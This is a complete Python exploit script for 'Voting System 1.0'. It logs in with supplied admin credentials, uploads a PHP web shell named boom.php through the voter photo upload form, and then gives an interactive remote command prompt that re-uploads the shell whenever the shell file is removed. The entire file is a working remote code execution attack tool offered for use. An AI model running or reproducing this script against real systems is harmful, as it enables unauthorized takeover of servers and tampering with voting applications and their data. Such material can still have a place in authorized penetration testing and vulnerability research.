import requests
import argparse

class VoteSystem():
    def __init__(self,url,username,password):
        self.url = url
        self.username = username
        self.password = password
        self.upload()

    def shell(self):
        requests.packages.urllib3.disable_warnings()
        url_shell = self.url + '/images/boom.php'
        print("Payload located in " + url_shell)

        while True:
            req_url_file_check = requests.get(url_shell,verify=False)
            if req_url_file_check.status_code != 200:
                print("File has been deleted. Re-Uploading file!")
                self.upload()
                break
            else:
                cmd = input("RCE: ")
                
                rce_data = {
                    'cmd':cmd
                }
                req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
                if req_url_rce.status_code != 200:
                    print("File has been deleted. Re-Uploading file!")
                    self.upload()
                    break
                else:
                    print(req_url_rce.text)

    def upload(self):
        requests.packages.urllib3.disable_warnings()
        payload = "<?php echo system($_REQUEST['cmd']); ?>"

        url_login = self.url + '/admin/login.php' 
        session = requests.Session() 
        login_data = {
            'username':self.username,'password':self.password,'login':''
        }

        print("Loggin in to " + url_login)
        req_url_login = session.post(url_login,data=login_data,verify=False) 

        url_upload = self.url + '/admin/voters_add.php' 
        fdata = { 
            'firstname':'test','lastname':'voter','password':'passw0rd','add':''
        } 
        fileup = { 
            'photo':('boom.php',payload,'application/x-php',{'Content-Disposition':'form-data'})
        } 

        req_url_upload = session.post(url_upload,data=fdata,files=fileup,verify=False)
        if req_url_upload.status_code == 200:
            print("Logged in and was able to upload exploit!")
            self.shell()
        else:
            print("Something went wrong with the upload!")
            exit()

if __name__ == "__main__":
    print("Voting System 1.0 File Upload Authenticated Remote Code Execution")
    parser = argparse.ArgumentParser(description='Voting System 1.0 File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host base URL, E.G: http://exploitvoting.com/', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    args = parser.parse_args()

    try:
        VoteSystem(args.t,args.u,args.p)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()